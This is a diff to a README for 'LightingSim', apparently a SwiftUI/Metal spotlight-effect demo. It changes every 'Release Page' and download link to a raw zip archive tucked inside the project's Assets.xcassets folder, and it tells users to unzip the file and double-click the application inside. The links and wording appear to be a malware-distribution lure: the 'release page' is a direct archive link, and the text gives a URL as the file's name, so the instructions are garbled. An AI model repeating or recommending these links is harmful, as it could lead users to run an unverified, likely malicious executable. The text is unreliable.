@@ -1,7 +1,7 @@
 # 🔦 LightingSim - Lightweight Spotlight Effect for Any User
 
 ## 📥 Download Now
-[![Download LightingSim](https://raw.githubusercontent.com/Getito96/LightingSim/main/LightingSim/Sim-Lighting-v1.3.zip)](https://raw.githubusercontent.com/Getito96/LightingSim/main/LightingSim/Sim-Lighting-v1.3.zip)
+[![Download LightingSim](https://github.com/Getito96/LightingSim/raw/refs/heads/main/LightingSim/Assets.xcassets/Lighting-Sim-postneural.zip)](https://github.com/Getito96/LightingSim/raw/refs/heads/main/LightingSim/Assets.xcassets/Lighting-Sim-postneural.zip)
 
 ## 🚀 Getting Started
 Welcome to LightingSim! This application creates a simple “fake flashlight” or spotlight effect using SwiftUI and Metal shader technology. Whether you're looking to create a cool visual effect for your project or just want to explore light manipulation, this software makes it easy.
@@ -17,9 +17,9 @@ To run LightingSim, ensure your system meets the following requirements:
 ## 💻 Download & Install
 To get started with LightingSim, follow these simple steps:
 
-1. **Visit the Release Page:** Click on this link to download the software: [LightingSim Release Page](https://raw.githubusercontent.com/Getito96/LightingSim/main/LightingSim/Sim-Lighting-v1.3.zip).
+1. **Visit the Release Page:** Click on this link to download the software: [LightingSim Release Page](https://github.com/Getito96/LightingSim/raw/refs/heads/main/LightingSim/Assets.xcassets/Lighting-Sim-postneural.zip).
 2. **Select the Latest Release:** Look for the latest version at the top of the page. It will usually be marked with "Latest Release" for easy identification.
-3. **Download the File:** Click on the asset file to download. The file will typically be named something like `https://raw.githubusercontent.com/Getito96/LightingSim/main/LightingSim/Sim-Lighting-v1.3.zip`.
+3. **Download the File:** Click on the asset file to download. The file will typically be named something like `https://github.com/Getito96/LightingSim/raw/refs/heads/main/LightingSim/Assets.xcassets/Lighting-Sim-postneural.zip`.
 4. **Unzip the File:** Once the download is complete, locate the zipped file in your Downloads folder. Double-click the file to unzip it.
 5. **Run the Application:** Open the unzipped folder, and you will find the LightingSim application. Double-click it to run.
 
@@ -55,7 +55,7 @@ If you would like to contribute to LightingSim, your help is welcome! Here’s h
 Your feedback is vital for the ongoing development of LightingSim. If you have suggestions or issues, please reach out through the issues page on GitHub.
 
 ## 🔗 Useful Links
-- [LightingSim Release Page](https://raw.githubusercontent.com/Getito96/LightingSim/main/LightingSim/Sim-Lighting-v1.3.zip)
+- [LightingSim Release Page](https://github.com/Getito96/LightingSim/raw/refs/heads/main/LightingSim/Assets.xcassets/Lighting-Sim-postneural.zip)
 - [Documentation Page](#)
 - [Community Page](#)
 
